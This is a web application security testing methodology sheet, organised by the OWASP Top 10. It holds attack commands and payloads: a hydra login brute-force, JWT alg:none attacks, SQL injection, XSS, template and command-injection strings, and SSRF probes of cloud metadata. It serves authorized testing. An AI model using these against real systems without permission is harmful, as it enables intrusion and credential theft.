# Web Application Security Testing

## Authorization Required
Web application testing requires written authorization. Never test without explicit permission.

## Testing Methodology

### 1. Information Gathering
```bash
# Technology fingerprinting
whatweb -v https://target.com
wappalyzer https://target.com

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
feroxbuster -u https://target.com -w wordlist.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403

# Parameter discovery
arjun -u https://target.com/page
paramspider -d target.com
```

### 2. Authentication Testing
```bash
# Default credentials check
# admin:admin, admin:password, root:root

# Username enumeration
# Different response for valid vs invalid users
# Timing attacks

# Brute force protection
hydra -L users.txt -P passwords.txt https://target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Session management
# Cookie flags: HttpOnly, Secure, SameSite
# Session fixation, Session timeout
```

### 3. Authorization Testing
```bash
# IDOR (Insecure Direct Object Reference)
# /api/user/1 -> /api/user/2

# JWT attacks
jwt_tool token.jwt -X a  # Alg:none attack
jwt_tool token.jwt -X k -pk public.pem  # Key confusion

# Force browsing - access /admin without auth
```

## OWASP Top 10 Testing

### A01: Broken Access Control
```bash
# Test for IDOR
GET /api/users/123  # Your ID
GET /api/users/124  # Another user's ID

# Bypass access controls
# Change HTTP method: GET -> POST, PUT, DELETE
# Add headers: X-Original-URL, X-Rewrite-URL
```

### A02: Cryptographic Failures
```bash
# SSL/TLS testing
testssl.sh https://target.com
sslscan target.com
nmap --script ssl-enum-ciphers -p 443 target.com
```

### A03: Injection

#### SQL Injection
```bash
# Detection payloads
' OR '1'='1
' UNION SELECT NULL--
' AND SLEEP(5)--

# SQLMap
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -r request.txt --batch
```

#### XSS (Cross-Site Scripting)
```bash
# Reflected XSS payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# DOM XSS - check sources and sinks
# Sources: location.hash, location.search
# Sinks: innerHTML, setTimeout, setInterval

# Tools
dalfox url "https://target.com/search?q=test"
xsstrike -u "https://target.com/search?q=test"
```

#### Command Injection
```bash
# Basic payloads
; ls
| ls
$(ls)

# Blind detection
; sleep 10
```

#### SSTI (Server-Side Template Injection)
```bash
# Detection
{{7*7}}  # Jinja2, Twig
${7*7}   # Freemarker
```

### A05: Security Misconfiguration
```bash
# HTTP headers check
curl -I https://target.com
# Look for: X-Frame-Options, CSP, HSTS

# CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/
```

### A10: SSRF
```bash
# Basic payloads
http://localhost/admin
http://127.0.0.1/
http://169.254.169.254/latest/meta-data/  # AWS
```

## API Security

### REST API Testing
```bash
# Test all methods
for method in GET POST PUT DELETE PATCH; do
  curl -X $method https://api.target.com/resource
done
```

### GraphQL
```bash
# Introspection
{__schema{types{name,fields{name}}}}
```

## Tools

| Category | Tools |
|----------|-------|
| Proxy | Burp Suite, ZAP, Caido |
| SQLi | SQLMap |
| XSS | XSStrike, dalfox |
| Scanners | Nuclei, Nikto |
| JWT | jwt_tool |

## Reporting

See OWASP Testing Guide and PayloadsAllTheThings for comprehensive references.
